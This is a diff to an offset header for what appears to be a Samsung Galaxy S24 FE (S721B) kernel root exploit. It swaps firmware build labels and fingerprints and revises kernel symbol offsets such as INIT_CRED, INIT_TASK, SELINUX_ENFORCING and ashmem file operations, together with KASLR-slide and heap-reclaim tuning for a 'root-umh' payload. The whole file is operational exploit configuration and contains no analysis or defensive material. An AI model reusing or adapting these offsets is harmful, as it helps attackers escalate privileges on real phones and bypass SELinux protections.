@@ -1,16 +1,9 @@
 #ifndef OFFSET_H
 #define OFFSET_H
 
-/*
- * Experimental Canadian S24 FE target cloned from the verified S721B DZF3
- * profile. Keep this target isolated so W-specific offsets/geometry can be
- * tuned without changing the known-good S721B profile.
- *
- * Canadian bootstrap CI validation is intentionally driven from this target.
- */
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL \
-  "r12s-S721WVLSCDZF4-app-experimental-slide8-fops8"
+  "r12s-S721BXXSCDZF3-app-production-slide8-fops8"
 #define APP_PHYS_P0_ORACLE 1
 #define APP_REQUIRE_FRESH_P0_SESSION 1
 #define APP_FOPS_DATA_ALIAS_DIAG_ONLY 1
@@ -29,24 +22,15 @@
 #define APP_DEFER_ALL_DRAIN_REAPS 1
 #define APP_ACCEPT_SCHED_TRIGGER 1
 #define APP_PSELECT_POST_GUARD_AGE_CHECK 1
-#define APP_TRACEFS_SLIDE 1
-#define APP_TRACEFS_KASLR_DIRECT 1
-#define APP_KERNEL_PAGE_KSNITCH_IDENTITY_END 0xffffff8080000000ULL
-#define APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION 1
 #else
-#define BUILD_VARIANT_LABEL "r12s-S721WVLSCDZF4-root-umh"
+#define BUILD_VARIANT_LABEL "r12s-S721BXXSCDZF3-root-umh"
 #endif
 
 #ifndef BUILD_FINGERPRINT
 #define BUILD_FINGERPRINT \
-  "samsung/r12sxxx/r12s:16/BP4A.251205.006/S721WVLSCDZF4:user/release-keys"
+  "samsung/r12sxxx/r12s:16/BP4A.251205.006/S721BXXSCDZF3:user/release-keys"
 #endif
 
-/*
- * Initial W profile is intentionally a direct clone of the verified S721B
- * 6.1.157 layout. These values are experimental for S721W and must be
- * replaced only after they are independently verified on the Canadian kernel.
- */
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
@@ -88,8 +72,8 @@
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
 #define APP_SLIDE_RECLAIM_SENDS 192
 #define APP_SLIDE_RECLAIM_SNDBUF 16777216
-#define APP_MM_LATE_DRAIN_TRIGGERS 2
-#define APP_SLIDE_MIN_OBJECT_INDEX 27
+#define APP_MM_LATE_DRAIN_TRIGGERS 4
+#define APP_SLIDE_MIN_OBJECT_INDEX 25
 #define APP_SLIDE_MAX_OBJECT_INDEX 30
 #define APP_FOPS_MIN_OBJECT_INDEX 12
 #define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8080000000ULL
@@ -124,7 +108,7 @@
 #define P0_ORACLE_GATE_OBJECT_INDEX 1
 #define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
 #define P0_FINGERPRINT_HEADER \
-  "targets/r12s-S721WVLSCDZF4/p0_fingerprint.h"
+  "targets/r12s-S721BXXSCDZF3/p0_fingerprint.h"
 #endif
 
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
@@ -133,24 +117,24 @@
 #define DIRECT_MAP_END 0xffffff9000000000ULL
 #define VMEMMAP_START 0xfffffffe00000000ULL
 
-#define ASHMEM_MISC_FOPS_OFF 0x02484970ULL
-#define ASHMEM_FOPS_OFF 0x013d9d08ULL
-#define ASHMEM_IOCTL_OFF 0x00d37cf8ULL
+#define ASHMEM_MISC_FOPS_OFF 0x02484970ULL  /* correto: ashmem_miscs + 0x10 */
+#define ASHMEM_FOPS_OFF      0x013d9c88ULL  /* alterado */
+#define ASHMEM_IOCTL_OFF     0x00d37cf8ULL
 #define ASHMEM_COMPAT_IOCTL_OFF 0x00d38630ULL
-#define ASHMEM_MMAP_OFF 0x00d38688ULL
-#define ASHMEM_OPEN_OFF 0x00d388b4ULL
-#define ASHMEM_RELEASE_OFF 0x00d3893cULL
+#define ASHMEM_MMAP_OFF      0x00d38688ULL
+#define ASHMEM_OPEN_OFF      0x00d388b4ULL
+#define ASHMEM_RELEASE_OFF   0x00d3893cULL
 #define ASHMEM_SHOW_FDINFO_OFF 0x00d38a5cULL
 #define CONFIGFS_READ_ITER_OFF 0x00470d44ULL
 #define CONFIGFS_BIN_WRITE_ITER_OFF 0x00471274ULL
 #define COPY_SPLICE_READ_OFF 0x003ef02cULL
-#define NOOP_LLSEEK_OFF 0x003a1414ULL
-#define INIT_TASK_OFF 0x022ff800ULL
-#define ROOT_TASK_GROUP_OFF 0x02515cc0ULL
+#define NOOP_LLSEEK_OFF      0x003a1414ULL
+#define INIT_TASK_OFF        0x022ff800ULL
+#define ROOT_TASK_GROUP_OFF  0x02515cc0ULL
 #define SELINUX_ENFORCING_OFF 0x025ea478ULL
-#define KMALLOC_CACHES_OFF 0x017a79d8ULL
-#define ANON_PIPE_BUF_OPS_OFF 0x0121db90ULL
-#define INIT_CRED_OFF 0x017e9018ULL
+#define KMALLOC_CACHES_OFF   0x017a7958ULL  /* alterado */
+#define ANON_PIPE_BUF_OPS_OFF 0x0121db10ULL  /* alterado */
+#define INIT_CRED_OFF        0x017e9018ULL
 
 #define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
 #define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
@@ -180,7 +164,7 @@
 #define ROOT_UMH_WORK_OFF 0x6000
 #define ROOT_UMH_DATA_OFF 0x6200
 
-#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x016dd06fULL
+#define SLIDE_NFULNL_LOGGER_NAME_OFF   0x016dcfefULL  /* alterado */
 #define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x022f2a08ULL
 #define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
 #define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x0243ef78ULL
